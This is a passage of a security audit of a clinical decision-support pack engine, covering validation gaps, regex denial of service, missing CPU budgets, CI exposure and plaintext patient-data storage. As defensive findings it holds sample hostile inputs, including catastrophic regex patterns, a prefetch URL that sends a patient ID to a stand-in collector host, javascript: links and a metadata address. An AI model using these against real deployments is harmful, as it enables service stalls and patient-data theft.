### A3.1c: Partial (verified); severity medium; stage 4; effort M (1-3 days)

**Plan says.** Validation rejects any pack field that names an environment variable, a secret, a header or a URL (p.9, step 1)

**Current state.** The reported exploit keys are refused at load, but validation is a six-name deny-list for two provider types, not a rule about fields. (1) `load_pack` (what a server runs at startup) refuses only api_key_env, connector_env, endpoint_env, model_env, base_url_env and local_key_env on `jev` and `llm` variants and composite members. (2) Other URL, header and secret keys on jev and llm (base_url, api_base, endpoint, url, headers, api_key, connector) pass `load_pack` and are refused only when the provider is built (`mendari validate` builds every variant; a server builds on first use), so load and validate disagree. (3) rules, naive_bayes, criteria and dosing variants accept arbitrary extra keys, api_key_env, base_url and headers included: `mendari validate` says ok on all 11 local variants of the five shipped packs (nothing reads the keys). (4) A `cds_hooks.prefetch` template that is an absolute URL to another host passes `mendari validate`; it is refused only at run time by FhirClient. (5) `publisher.url` and `card.evidence[].url` accept any scheme (javascript:, a metadata address); the evidence URL is written into the Decision Card as a Markdown link. (6) A URL-shaped string is accepted as `model`. No request to a pack-chosen host was possible in any probe.

**Evidence.**

- src/mendari/core/spec.py:41-59,303-315 - DEPLOYMENT_ENV_KEYS deny-list for types jev and llm, applied to the variant and its members one level deep
- src/mendari/providers/rules.py:67-71, naive_bayes.py:38,58, dosing.py:128-134, criteria.py:186 - each reads only its own keys from the variant; other keys are never checked
- src/mendari/core/spec.py:92-107,461 - publisher.url, evidence.url and prefetch templates are plain strings with no check
- src/mendari/core/card.py:168 - `[{evidence.title}]({evidence.url})` with no scheme check
- src/mendari/providers/llm.py:51 - MODEL_PATTERN allows ':' and '/', so 'https://collector.example.org/v1' is a valid model id
- $ python skeptic/fields.py (19 scratch packs; load_pack and `mendari validate`) -> llm + base_url, api_base, headers or api_key and jev + endpoint, url or connector: load_pack LOADS, validate rc=1 (extra_forbidden); llm + base_url_env, jev + api_key_env, any_of member jev + api_key_env: REFUSED at load; llm model = https://collector.example.org/v1: validate rc=0 ok; publisher.url javascript:, card.evidence url javascript: and http://169.254.169.254/...: validate rc=0 ok
- $ python skeptic/fields2.py (api_key_env + base_url + headers added to one variant of each type in the five shipped packs, 28 runs) -> rules, naive_bayes, criteria, dosing: validate rc=0 ok in 11 of 11; jev, llm: refused at load; cql, any_of, cascade: rc=1 extra_forbidden; the variable's value echoed in none
- $ python skeptic/prefetch.py -> pack with prefetch 'https://collector.example.org/steal?p={{context.patientId}}': mendari validate rc 0 ok; FhirClient.read of it -> refused: a FHIR request left the server's base URL, no request sent
- tests/test_providers.py:294-297 - the test asserts {type: naive_bayes, x_env: 1} loads ('that provider's business')

**Recommendation.** Make `load_pack` the single choke point: validate every variant and member against its provider's closed config model at load (register each provider's pydantic model; give rules, naive_bayes, criteria and dosing variants `extra="forbid"`), so load and validate agree and a server never lists as valid a pack that validate refuses; add a parity test for that. Add load-time checks that a prefetch template is a relative FHIR read or search (no scheme, no `//`, no `..`), that publisher and evidence URLs are https, and that `model` has no `://`. Keep the env-key deny-list as the friendlier message. Scope the rule to fields that can change where a request goes or which credential is attached: the shipped packs legitimately hold URLs (schema `$id`, FHIR code systems).

### A3.2a: Missing (verified); severity blocker; stage 4; effort L (1-2 weeks)

**Plan says.** Evaluate every pack pattern with a linear-time engine (google-re2) (p.9, step 2)

**Current state.** Every pack-authored pattern runs on Python's backtracking `re`; there is no linear-time engine anywhere and google-re2 is neither a dependency nor installed. Rules patterns: `re.compile(p.pattern, re.IGNORECASE)` then `finditer`. Input-schema `pattern` and `patternProperties` keys: jsonschema's own `re.search`. The module docstring says patterns have no time limit and that isolation is deferred to the upload or registry feature; tasks/todo.md and the threat model (leads) say a second regex engine with a time budget was tried and dropped, without naming google-re2. Measured again with the real loader and rules provider: 7 of 7 catastrophic rules patterns and 1 schema pattern were accepted at load and had not finished a 10,000-character input when killed at 20 s. The shipped patterns are not linear either: the unmodified inbox pack takes 563 ms of CPU on one crafted 10,000-character message (0.3 ms on an ordinary one; the time quadruples when the length doubles). Four shipped patterns use lookaround, which RE2 cannot compile.

**Evidence.**

- src/mendari/core/patterns.py:3-4,10-14,39 - 'run on Python's `re`, as they always have'; '`re` has no time limit'; the load check is `re.compile(text, flags)`
- src/mendari/providers/rules.py:92,159 - re.compile(p.pattern, flags); regex.finditer(text)
- src/mendari/core/decision.py:250,441 - jsonschema iter_errors on the input; re.search(p, key) for patternProperties
- pyproject.toml:17-28,39-48 - no google-re2 or other regex engine in the dependencies or the dev group; $ grep -c -E 'name = "(google-re2|pyre2|re2|regex)"' uv.lock -> 0; importlib.util.find_spec('re2') -> None
- $ python skeptic/redos_parent.py (scratch copy of packs/patient-inbox-router plus one rules pattern, real load_pack and Decision.decide, 10,000-character body, child killed at 20 s) -> baseline: load 22.8 ms, decide 7.6 ms; (a+)+$, (a*)*$, (a|aa)+$, (a|a?)+$, ^(([a-z])+.)+[A-Z]([a-z])+$, (\w+\s?)+$, (x+x+)+y: each accepted at load (22-28 ms), then KILLED at the 20 s hard timeout inside decide; schema pattern ^(a+)+$ on message.body: the same
- $ python skeptic/shipped_decide.py (unmodified inbox pack, default providers) -> ordinary message 0.3 ms CPU; body 'puk' repeated to 10,000 characters 563.0 ms (37.9 ms at 2,500, 150.1 ms at 5,000); 8 of 154 crude bodies over 50 ms
- $ python skeptic/shipped.py -> 104 shipped patterns (102 rules, 2 schema); RE2 cannot compile 4 (ai-guard claim-about-the-record; clinical-trial-prescreener pregnant and pancreatitis; referral-router new-lung-mass); 53 use \b, 36 use \w, \s or \d, 2 hold non-ASCII literals; 3 over 50 ms on crude 10,000-character texts (gi-bleeding 599.5 ms, coughing-blood 367.0, pregnancy-bleeding 336.2)
- packs/patient-inbox-router/logic/red_flags.yaml:49-58 - gi-bleeding, coughing-blood and pregnancy-bleeding patterns (a word run followed by a bounded gap), the quadratic ones
- tasks/todo.md:269-272 and docs/security/threat-model.md:82-92 - 'the regex-engine approach was tried and dropped' (leads; the branch claude/pack-safety was not read)

**Recommendation.** The owner must pick the mechanism before a build session starts, because the repository's written direction (process isolation) differs from the plan's (RE2). Option A, the plan: google-re2 for rules patterns and a custom jsonschema `pattern` and `patternProperties` keyword; rewrite the 4 lookaround patterns; prove the reference decisions identical or bump the affected pack versions and regenerate data, models, benchmarks and cards; pin the dialect in a new spec version. Option B, the repository's stated direction: keep `re` and run every outside pack's schema check and local providers in a worker process with a CPU-time limit and a kill (this also delivers A3.2c). RE2 alone does not meet the goal: see A3.2c for pack content that stalls a decision with no pattern at all. Either way, no outside pack may be served, community packs included, before one of them lands.

### A3.2b: Partial (verified); severity high; stage 4; effort S (<1 day)

**Plan says.** Validation rejects patterns RE2 cannot compile, with a clear message (p.9, step 2)

**Current state.** The mechanism exists, for the wrong engine: at load every rules pattern (every variant and composite member) and every schema `pattern` and `patternProperties` key is compiled with `re`, capped at 2,000 characters and 500 per pack, and a failure is a PackValidationError naming pack, file, rule index and rule name, with no traceback from `mendari validate`. - src/mendari/core/pack.py:230-236,338-359 - _pattern_problems at load, counted before any is compiled

### A3.2c: Missing (verified); severity blocker; stage 4; effort L (1-2 weeks)

**Plan says.** Add a per-decision CPU budget (p.9, step 2)

**Current state.** There is no CPU or wall-clock budget on a decision. `Decision.decide` validates the input and calls each provider with no deadline; `CallBudget` counts remote calls per day and decisions per organization, not time. While `re` backtracks it holds the interpreter: after one 10,000-character request started on a pack with (a+)+$, the main thread of the same process never ran again before the 20 s kill, so nothing else in that worker (other packs, health) is served. Patterns are not the only route: a 3 KB input schema with no pattern at all (two internal `$ref`s under `allOf` per level, 28 levels) loads in 0.03 s and stalls a decision on a 13-character message; a wording template with a format width passes validation and allocates that many characters per CDS card. Limits that do exist: a 4 MiB request body, pattern count and length caps, remote timeouts (Jev up to 10 s, LLM up to 120 s plus one retry), rate limits and Vercel's 300 s function limit.

**Evidence.**

- src/mendari/core/decision.py:253-344 - decide(): validate, then provider.preflight() and answer() in a loop; no timer, deadline or time budget
- src/mendari/core/decision.py:127-175 - CallBudget: daily call and decision counts only
- $ git grep -n -I -E 'setrlimit|RLIMIT|signal\.(alarm|setitimer|SIG)|deadline|time_limit|cpu_budget|ProcessPoolExecutor|multiprocessing' -- 'src/*.py' -> only sandbox/fhir_workflow.py's wait loop
- vercel.json:10 - maxDuration 300 (a platform wall-clock limit, on Vercel only)
- $ python skeptic/health_probe.py during (TestClient, 9 scratch packs) -> health 200 and a benign decide on the (a+)+$ pack 200; then, with a 10,000-character decide running in a second thread, the line after a 0.5 s sleep in the main thread never printed and the process was KILLED at the 20 s hard timeout
- $ python skeptic/schema_fanout.py -> schema with no `pattern`, allOf of two $refs per level: depth 10 decide 0.03 s CPU; depth 14 0.43 s; depth 28 (2,952 bytes): load_pack accepted in 0.03 s, decide on 'refill please' KILLED at the 20 s hard timeout
- src/mendari/core/templates.py:22-35 and src/mendari/standards/cds_hooks.py:179,199 - unknown_placeholders checks names only; fill() is str.format_map on the pack's template; the summary is cut to 140 afterwards
- $ python skeptic/template_child.py 200000000 -> mendari_validate_rc 0; card_summary_chars 140; peak_rss_mib 260 (72 with width 100)

**Recommendation.** A CPU budget cannot be enforced in-thread on `re` (the match holds the GIL, and signals reach only the main thread). Run pack-authored work (schema check, local providers) for packs that are not the deployment owner's in a pooled worker process with RLIMIT_CPU and RLIMIT_AS and a parent-side kill; a blown budget is a ProviderError (`budget_exhausted`) so the policy sends the case to a person, never AUTO. Add a wall-clock deadline across providers for remote calls. Refuse format specs and conversions in pack templates at load (bare `{name}` only), and cap schema size and reference depth. Test with a pattern-free case as well as the regex ones.

### A3.2d: Partial (verified); severity high; stage 4; effort S (<1 day)

**Plan says.** The health check must never evaluate pack patterns (p.9, step 2)

**Current state.** The sentence as written holds: `/api/health` never matches a pack-authored pattern against anything, and without a credential it returns three fields before touching packs or the database. Its purpose does not hold. For any principal that may read (everyone in open mode, the self-hosted default) health builds every served pack's providers inside the request (`decision_for`), which is pack-dependent work: Mendari's own `_HEADER` regex runs over the pack's CQL library, and that regex is quadratic. A scratch pack whose default variant is `cql` with a 64 KiB newline-padded library loads in 0.09 s and makes the first health call take 3.5 s; with 396 KiB the call had not returned at 20 s. A pack whose build fails is not cached, so health pays the cost on every call (1.5 s each, four calls in a row, for a 40 KiB library with no declaration). The container HEALTHCHECK (3 s timeout), the Kubernetes readiness and liveness probes and the dashboard's first request all use `/api/health`. And health cannot answer at all from a worker that is inside a backtracking match (A3.2c).

**Evidence.**

- src/mendari/server/app.py:577-580 - the public answer is returned before any pack work when there is no reading principal
- src/mendari/server/app.py:583-593 and 379-410 - for a reader: `decision_for(pack_id)` for every served pack; a build that raises is not stored in `decisions`
- src/mendari/providers/cql.py:57,119 - `_HEADER = re.compile(r"^\s*library\s+...", re.MULTILINE)`; `_HEADER.search(self.source)` in CqlProvider.__init__
- $ python skeptic/health_probe.py cql N (scratch pack, default variant cql, library = N newlines + the shipped library) -> N=0: first health 0.05 s; N=20,000 (25 KiB): 0.39 s; N=60,000 (64 KiB): load_pack 0.09 s, first health 3.51 s, status 200, invalid {}; N=400,000 (396 KiB): load_pack 0.03 s, create_app 0.12 s, then KILLED at the 20 s hard timeout inside the first /api/health
- $ python skeptic/health_repeat.py 40000 (library = 40,000 newlines + a define, no declaration) -> health calls 1 to 4: 1.54, 1.51, 1.51, 1.51 s, status 200, the pack listed invalid each time
- Dockerfile:47-48 - HEALTHCHECK --timeout=3s on /api/health; deploy/kubernetes/mendari.yaml:65-70 - readinessProbe and livenessProbe on /api/health; src/mendari/dashboard/main.js:26 - the dashboard boots on /api/health
- tests/test_public_surface.py::test_anonymous_health_is_three_fields_and_no_database_work - exists (signed-out answer does no pack work)
- tests/test_cql.py:365-369 - test_finding_the_declaration_is_linear checks library_declaration only, not the `_HEADER.search` that runs first

**Recommendation.** Make health report state computed elsewhere: build providers at startup or on first decide under a per-pack time limit, record {pack: built | invalid | not built yet} (failed builds included, so they are not retried on every call), and have health read that table; never construct a provider inside the health request. Replace `_HEADER.search` with the linear `library_declaration` (take name and version from its match), cap pack text file sizes at load, and add the padded-library case to tests/test_cql.py through CqlProvider construction.

### A3.pre-1: Partial (verified); severity low; stage 3; effort S (<1 day)

**Plan says.** Required before any upload, registry or community-pack feature (p.9, goal): does an outside author's pack already run in CI, and with which secrets?

**Current state.** Yes, in CI, with no secrets and no time limit. `packs.yml` runs on `pull_request` for any change under packs/ and executes `mendari validate`, `test`, `card` and `eval` on the pull request's pack. The trigger and token are safe for forks: no pull_request_target, `contents: read`, `persist-credentials: false`, no `secrets.*` in the job, the pack directory passed as data by argv; tests hold these rules. So the only credential in scope is a read-only GITHUB_TOKEN, and a `jev` or `llm` default variant fails as not configured. The job has no `timeout-minutes`, and the commands evaluate the pack's patterns on the pack's own test inputs: a hostile pack stalls `mendari validate` (schema pattern) or `mendari test` (rules pattern) on a 41-character input. The cost is runner time only, bounded by GitHub's job limit, and a fork pull request can already edit a workflow it triggers, so a timeout in the file protects only pack-only pull requests. Whether the repository is still private cannot be told from the tree.

**Evidence.**

- .github/workflows/packs.yml:7-12 - `on: pull_request: paths: [packs/**]`, `permissions: contents: read`
- .github/workflows/packs.yml:15-16,43-48 - the job has no timeout-minutes; it runs mendari validate, test, card and eval on "$dir"
- $ grep -n 'timeout-minutes' .github/workflows/*.yml -> only ci.yml:430
- $ grep -n -E '\$\{\{ *secrets\.' .github/workflows/*.yml -> images.yml:40 (GITHUB_TOKEN) and neon-preview-cleanup.yml:35; none in packs.yml or ci.yml
- tests/test_workflow_safety.py::test_no_trigger_runs_fork_code_in_the_base_context, ::test_secrets_never_reach_a_fork_pull_request, ::test_a_pack_directory_is_data_never_code - pass (24 passed in the file, re-run)
- $ python skeptic/ci_packs.py, then mendari under a 20 s kill -> validate on a pack with schema pattern (a+)+$|[\s\S] and its own 41-character test input: KILLED at 20 s; validate on a pack with rules pattern (a+)+$: rc=0 in 0.65 s; `mendari test` on that pack: KILLED at 20 s

**Recommendation.** Before the repository is public: add `timeout-minutes` (for example 10) to the packs job and a per-command timeout in the loop, and assert both in tests/test_workflow_safety.py. Keep GitHub's approval for outside contributors' workflow runs on, and approve a run only after reading the diff (owner). When the regex safeguard lands, run the same screen in this job so a ReDoS pack fails fast with a named rule.

### A3.pre-2: Partial (verified); severity high; stage 3; effort M (1-3 days)

**Plan says.** Required before any upload, registry or community-pack feature (p.9, goal): does an outside author's pack run on a server before the safeguards exist?

**Current state.** At the audited commit the server has no upload route and no community-pack loading: it serves what `discover` finds in MENDARI_PACKS_PATH, the local pull cache and the bundled packs/. An outside pack reaches a server only if an operator pulls or copies it, or if it is merged into packs/ and deployed. The pieces that would let one in already ship: the registry service accepts signed publishes from a namespace token and loads the pack (hub/archive.py:236 calls load_pack: compile only, but at 1.45 s for one in-cap pattern and 500 patterns allowed per pack that can hold it for minutes, by extrapolation), and `mendari pull` and `Decision.from_hub` fetch, verify and run registry packs. The owner's 2026-10-04 decision in tasks/todo.md (a lead) is to serve community packs live, recommend only, once the repository is public, and branch claude/community-packs carries that work (8 commits ahead, in flight, not audited). If that is switched on before A3.2a and A3.2c, an outside pack runs in the production function next to the deployment's Jev and gateway credentials: it cannot redirect them (A3.1b) but can freeze the worker and, unless the branch's own caps hold, spend on the LLM. Unknown from the tree: whether the registry is deployed anywhere, and whether Vercel builds preview deployments for fork pull requests with Preview secrets.

**Evidence.**

- src/mendari/server/app.py:354-364 - packs come from discover(packs_paths) only; $ grep -n -E '@app\.(post|put|delete|patch)\(' src/mendari/server/app.py -> decide, guard, fhir/decide, governance, evals, review, outcome, feedback, cds-services, pas, questionnaire-package, $decide; no pack upload
- src/mendari/core/registry.py:27-37 - search path: MENDARI_PACKS_PATH, the pull cache, the bundled packs
- src/mendari/hub/registry.py:205-229,555-556 - PUT /v1/packs/{namespace}/{name}/{version}: verify the signature, extract, load, describe
- src/mendari/core/decision.py:212-229 - Decision.from_hub pulls from the registry and runs the pack
- $ ls community-packs -> No such file or directory; $ git grep -n -i -E 'upload|community' -- src/mendari/server src/mendari/core/registry.py -> no match
- tasks/todo.md:7-11,60-63,69-75,91-92 - community packs 'served live but recommend only'; B4 lists 'the regex probe'; B9 MENDARI_COMMUNITY_PACKS=on in Production (leads)
- $ git log --oneline HEAD..claude/community-packs -> 8 commits (6a2e3b71 origin-aware loading and recommend-only policy ... 5301e88e 'the probe enters each pattern at each piece'): in flight, not audited
- vercel.json:3-7 - deployments are disabled only for dependabot/** branches

**Recommendation.** Hold the line the plan draws: do not enable community packs on the hosted deployment, deploy the registry, or add upload until A3.2a, A3.2c and A3.2d are done. If the owner wants community packs live earlier, make that a recorded exception with compensating controls checked in CI: local providers only, the regex screen plus a timed probe, a code owner's review of every pattern and of the schema, and a separate Vercel project or function for community packs with no provider credentials in its environment. Owner: confirm Vercel Git Fork Protection is on and that the Preview environment holds no production credentials before the repository goes public.

**Unit notes.** Skeptic pass on unit A3 at commit e55ed48c (branch audit/vision-2026-10). I re-opened every cited file and re-ran every measurement with my own scripts, under scratchpad/tmp/A3/skeptic/ (cited as skeptic/<name>); the only auditor script I reused, after reading it, is template_child.py, copied there and run with my own output directory. ### A4.1.repro: Contradicts the plan (verified); severity blocker; stage 2; effort M (1-3 days)

**Plan says.** Goal: no configuration can automate a missed emergency (p.10). Claim: a rules-only deployment AUTO-routed 7 of the 20 held-out emergencies it missed (p.3).

**Current state.** Reproduced independently (own script, offline, deterministic over two passes) and through the CLI, REST and CDS Hooks. Held-out set red_flags_holdout: 30 records, 20 true emergencies; the keyword screen detects 4 and misses 16; 7 of the 16 missed end AUTO (rfh-u04, u09, u10, u11, u12, u18, u19), each recommended `nurse` at priority `routine` on router confidence 0.91-0.99 with P(urgent)=0.12; the other 9 missed go to HUMAN_REVIEW, also at routine priority. Other sets, default configuration: calibration 11 of 12 detected (the 1 missed went to HUMAN_REVIEW), test 23/23, red_flags 28/28, local-site (n=400) 18/18; no true emergency automated on any of them. With router=rules: the same 16 missed, 0 AUTO, but 14 of the 16 ABSTAIN (fallback: left in the shared inbox for the front desk) and 2 go to HUMAN_REVIEW. So the plan's figure is right when read as 7 automated among the 16 missed of 20.

**Evidence.**

### A4.1.other-packs: Partial (verified); severity low; stage 2; effort S (<1 day)

**Plan says.** (Orchestrator check under the p.10 goal 'no configuration can automate a missed emergency') no other reference pack can AUTO a missed critical label in a rules-only deployment.

**Current state.** Without a governance override the answer is no, verified: each of the four other packs has exactly one offline configuration (its default) and it produces zero AUTO on calibration, test, tuning, held-out and local-site sets. Referral-router, prior-auth-preflight and ai-guard carry automation_requires; clinical-trial-prescreener is held by its risk level 2 only. All four miss critical cases with keyword rules (referral held-out 5 of 12 urgent; prior-auth held-out 3 of 6 red flags and 2 of 11 at the local site; ai-guard held-out 5 of 9 blocks; trial held-out 4 exclusion notes) and none of the missed is automated. The exception is the trial pack under a recorded governance override: it has no automation_requires, so the rules-only configuration then automates (183 of 300 on test, 95 of 150 at the local site), including 3 cases whose critical note label the keyword screen missed. All 3 were recommended and truly `not_eligible`; a missed exclusion cannot become an automated `candidate` because that label is allow_auto: false. So no harmful automation was found, but 'no configuration' does not hold literally, and no test asserts the invariant over a dataset for any pack.

**Evidence.**

- $ $S2/run.sh sk_repro.py $W referral-router -> one offline configuration; calibration, test, urgent_referrals, urgent_referrals_holdout and local-site all {HUMAN_REVIEW: n}; holdout urgency=urgent true=12 detected=7 missed=5 missed&AUTO=0
- same script, prior-auth-preflight -> all {HUMAN_REVIEW: n}; documentation_notes_holdout red_flag=yes true=6 detected=3 missed=3; local-site true=11 detected=9 missed=2; missed&AUTO=0
- same script, ai-guard -> only BLOCK and HUMAN_REVIEW on all five sets; unsafe_drafts_holdout verdict=block true=9 detected=4 missed=5, all HUMAN_REVIEW routine
- same script, clinical-trial-prescreener (level 2, automation_requires=None) -> all {HUMAN_REVIEW: n}; exclusions_holdout 4 missed notes, 0 AUTO
- $ $S2/run.sh sk_gov.py $W -> trial with a GovernanceOverride, default offline providers: AUTO 111/200 calibration, 183/300 test, 6/32 exclusions, 2/24 exclusions_holdout, 95/150 local-site; missed&AUTO: trial-0280 (note_pregnancy), trial-local-0148 (note_active_cancer_treatment), trial-local-0084 (note_recent_cv_event), each (recommended, truth) = (not_eligible, not_eligible); AUTO among true critical cases is non-zero there (e.g. egfr_30_or_more=no 26 of 29 on test) because detected exclusions are automated as not_eligible
- packs/clinical-trial-prescreener/policy.yaml:15-16 - `candidate: allow_auto: false`; the file has no automation_requires
- tests/test_referral_pack.py:98-104, packs/ai-guard/tests/cases.yaml:12, packs/prior-auth-preflight/tests/cases.yaml:22 - single-case checks only ('rules only: no AUTO'); no dataset-wide assertion exists for any pack

**Recommendation.** No pack change is needed for safety. Turn the reproduction into a parametrised test over every pack, every offline configuration and every dataset asserting zero AUTO when the screening slot has no model (it runs in well under a minute), so community packs inherit the invariant. Decide and record whether the trial pack should also carry automation_requires on `notes` for uniformity; if not, write the invariant as 'no AUTO without an override', because 'auto_missed == 0' is false for the trial pack once an override is approved.

## A5. Patient-data protection on the hosted site

### A5.1a: Missing (verified); severity blocker; stage 2; effort S (<1 day)

**Plan says.** Make encrypt the default PHI mode on the hosted deployment (p.10, A5 step 1, first half).

**Current state.** The encrypt mode itself exists and is tested (AES-256-GCM; input, evidence and notes sealed apart from the chain). But the default in every environment is `off`, and nothing in the Vercel entrypoint, vercel.json or app.py sets or requires another mode. I imported the real Vercel entrypoint (mendari.server.vercel) with VERCEL=1, sign-in on and no PHI variables: it starts, reports phi_mode off with unkeyed sha256 hashes, and a decision's input is written in plaintext inside the chained record. All five reference packs are store_input: full, so `off` means plaintext for every pack. The self-hosted templates (Kubernetes, on-prem) set encrypt; Vercel has no equivalent. Nothing here changed since the plan's commit: none of the 21 later commits touches phi.py, audit.py, vercel.py or settings.py.

**Evidence.**

- src/mendari/core/phi.py:141 - mode = os.environ.get('MENDARI_PHI_MODE', '').strip().lower() or 'off'
- src/mendari/server/vercel.py:43-61 - on Vercel only DATABASE_URL is required; create_app gets no PHI argument
- vercel.json:1-14 - only the git and functions keys; no env, no crons
- src/mendari/core/audit.py:374-376 - under mode off with store_input full, record['input'] = dict(inputs)
- packs/patient-inbox-router/pack.yaml:214, packs/ai-guard/pack.yaml:272, packs/clinical-trial-prescreener/pack.yaml:327, packs/prior-auth-preflight/pack.yaml:284, packs/referral-router/pack.yaml:270 - store_input: full
- tests/test_phi.py::test_the_settings - asserts phi_policy().mode == 'off' when the variable is unset (ran: pass)
- $ python s3_guard_keys.py, part (a): VERCEL=1, DATABASE_URL=<scratch sqlite>, MENDARI_OIDC_* set, MENDARI_PHI_MODE unset, import mendari.server.vercel -> health {'sign_in': True, 'phi_mode': 'off', 'input_hash': 'sha256'}; POST decide 200; records holding their input in plaintext: 1
- deploy/kubernetes/mendari.yaml:27 and deploy/onprem/.env.example:20 - MENDARI_PHI_MODE encrypt, in the self-hosted templates only
- $ git diff --stat 0182417c..HEAD -- src/mendari/core/phi.py src/mendari/core/audit.py src/mendari/server/vercel.py src/mendari/settings.py -> no output

**Recommendation.** Fail closed in src/mendari/server/vercel.py: when VERCEL is set, refuse to start unless MENDARI_PHI_MODE is encrypt or hash, with an error naming MENDARI_PHI_MODE, MENDARI_PHI_KEY and MENDARI_INPUT_HASH_KEY. A default cannot invent two keys, so on the hosted site 'default' has to mean a startup refusal. Order matters: the owner sets the three variables for Production and Preview first (A5.1c), or the first deploy with the check takes the site down. Add tests to tests/test_vercel.py (three tests today, none about PHI) and document the variables in deploy/vercel/README.md.

### A5.1a-hash: Done (verified); severity none; stage 2; effort S (<1 day)

**Plan says.** Hash is available as an option to encrypt (p.10, A5 step 1: 'with hash as an option').

**Current state.** MENDARI_PHI_MODE=hash is accepted on any deployment and needs MENDARI_INPUT_HASH_KEY (startup is refused without it). Nothing of the input or its evidence is stored, only a keyed HMAC, and a review or rating that carries a note is refused with 422. With sign-in on I asked 41 mounted GET and search routes plus 4 extra URLs as 7 principals: no input, note or evidence text came back to anyone, and the chain verified. Two limits to know: reviewers decide without seeing the message, and rows recorded earlier under `off` stay readable after a switch to hash (see A5.acc-2).

**Evidence.**

- src/mendari/core/phi.py:142-153 - hash is one of three accepted modes and needs the input hash key
- src/mendari/core/audit.py:374 - keep is False under hash, so neither input nor evidence is stored; :782-783 - a note is refused under hash
- tests/test_phi.py::test_hash_mode_stores_no_input and tests/test_record_hygiene.py::test_no_lab_value_date_or_patient_id_is_stored (hash and encrypt; ran: pass on SQLite, Postgres variants skipped)
- $ python s2_routes.py hash -> reading under {'sign_in': True, 'phi_mode': 'hash', 'input_hash': 'hmac-sha256'}; feedback with a note: 422; every route row '---' for all 7 principals; 'TEXT SHOWN TO NON-READERS, OR SHOWN WITHOUT A CHAINED READ: none'; verify ok True

**Recommendation.** None for the mode itself. When A5.1a adds the hosted startup check, accept hash there as the plan says.

### A5.1b: Contradicts the plan (verified); severity blocker; stage 2; effort M (1-3 days)

**Plan says.** Plaintext storage is allowed only in open-mode local sandboxes (p.10, A5 step 1, second half).

**Current state.** No guard exists, and the forbidden combination is the default. `off` is accepted with sign-in on, with VERCEL set and on Postgres: create_app reads the sign-in settings and the PHI policy one after the other and never relates them. I ran it: with sign-in on and mode off, every principal that may `read` (viewer and governance people, viewer and service keys, as well as reviewers and admins) gets stored input text from GET /api/audit, /api/audit/{id}, /api/review and /api/feedback, note text from /api/audit/{id} and /api/feedback, and evidence from /api/audit and /api/review; no read is chained for anyone. 14 of the 19 test files that turn sign-in on, and the compose `engine-signin` service, run this combination. A second way to reach it on the hosted stack, from leads only: the README says previews run without sign-in and share the production database unless Neon branching is on, and the entrypoint does not tell Preview from Production, so a preview without PHI variables would write plaintext records. In mode off an unhandled exception is also re-raised unchanged instead of being replaced by its type (inferred to reach the runtime log with its message; not observed).

**Evidence.**

- src/mendari/server/app.py:323-334 - auth_settings(), phi_policy() and AuditStore(...) in sequence; no check relates sign-in to the PHI mode
- src/mendari/core/phi.py:138-161 - phi_policy() checks the mode name and the keys only; no reference to sign-in, VERCEL or the backend
- $ python s2_routes.py off (sign-in on) -> GET /api/audit: person:viewer, person:governance, person:reviewer, person:admin, key:viewer, key:service all '200 I-E +0'; /api/audit/{id} 'IN- +0'; /api/review 'I-E +0'; /api/feedback 'IN- +0' (I input, N note, E evidence shown; +0 input.read chained); anonymous 401
- src/mendari/core/audit.py:1000-1003 - reveal_inputs replaces record['input'] only for decisions with a decision_inputs row; :2011-2016 - _row returns the stored record as is
- src/mendari/server/security_log.py:265,306-308 - quiet_errors only under hash or encrypt; otherwise the exception is re-raised unchanged
- docker-compose.yml:76 - engine-signin sets MENDARI_OIDC_ISSUER; the file sets no MENDARI_PHI_MODE
- $ git grep -l MENDARI_OIDC_ISSUER -- tests | wc -l -> 19; of those that name MENDARI_PHI_MODE -> 5
- README.md:886-887 and 924-926 - LEAD: previews run without sign-in, and share the production database unless Neon preview branching is enabled
- src/mendari/server/vercel.py:47 - only VERCEL is read; Preview and Production are not told apart

**Recommendation.** One startup guard in create_app: refuse mode `off` when sign-in is on or when VERCEL is set. Decide the Postgres clause deliberately: the plan does not name it, and 13 test files start the server on a database that is Postgres in CI's Postgres job (git grep -l 'db_path=db_target' -- tests), 11 of them without ever naming a PHI mode, so adding it means moving those too. Give tests/conftest.py a helper that sets encrypt-mode keys for signed-in fixtures, update the 14 sign-in test files and docker-compose.yml engine-signin, and report how many tests changed. Longer term, keep inputs out of the chained record in every mode (see opportunities) so `off` only ever means unencrypted, never unerasable.

### A5.2a: Missing (verified); severity blocker; stage 2; effort M (1-3 days)

**Plan says.** Schedule the retention purge on the hosted site (Vercel cron) (p.10, A5 step 2).

**Current state.** Nothing schedules a purge for the hosted site: vercel.json has no `crons`, no server route runs a purge (the only callers of purge_inputs and purge_notes are the CLI command and a sample script), and no GitHub workflow is scheduled. Retention exists only as `mendari phi purge`, scheduled in the self-hosted templates (a Kubernetes CronJob, a compose loop). On Vercel nothing ever deletes a kept input or note. Two traps for whoever builds it: an unlisted GET under /api/ falls to the catch-all `read` rule, so a cron route added without its own rule could be triggered by any viewer key; and the guard refuses any Bearer value that is not an API key or an access token, so Vercel's `Authorization: Bearer <CRON_SECRET>` only works on a route listed as public that checks the secret itself.

**Evidence.**

- vercel.json:1-14 - no crons key
- $ git grep -n -i -E 'crons|CRON_SECRET|x-vercel-cron|/api/cron|/api/internal|schedule:' -- . ':!docs/**' ':!notes/**' -> only .github/dependabot.yml, deploy/kubernetes/mendari.yaml:93 and pack text
- $ git grep -n -E 'purge_inputs|purge_notes' -- src scripts -> callers: src/mendari/cli.py:889 and scripts/audit_fhir_sample.py:49 only
- $ git grep -n -E '@app\.(get|post|put|delete)' -- src/mendari/server -> 60 route decorators (plus 8 FHIR search routes added in a loop); none purges
- deploy/kubernetes/mendari.yaml:89-109 - CronJob mendari-daily runs `mendari phi purge` (self-hosted only)
- deploy/onprem/docker-compose.yml:35-51 - the jobs service loops the purge every 86400 s (self-hosted only)
- src/mendari/core/audit.py:1016-1029 - purge_inputs: one exclusive session, SELECT then DELETE with no LIMIT
- src/mendari/server/auth.py:174 - ('GET', '^/api/', 'read') catch-all; :599 - a Bearer that is neither ohk_ nor mat_ is refused; :627 - public routes skip authentication

**Recommendation.** Add a cron route (for example GET /api/internal/retention), listed in auth._RULES as public and placed before the /api/ catch-all, that compares `Authorization: Bearer $CRON_SECRET` in constant time and refuses when the secret is unset. Purge in bounded batches inside the 300 s function limit, write a `retention.run` security-log line with counts, and add `crons` to vercel.json. Tests: refused without the secret; refused for a viewer key; purges with the secret; `audit verify` passes; every vercel.json cron path is a mounted route. Vercel cron calls the production deployment only: say what happens to preview databases (A5.goal-previews). The owner sets CRON_SECRET.

### A5.3a: Missing (verified); severity high; stage 2; effort L (1-2 weeks)

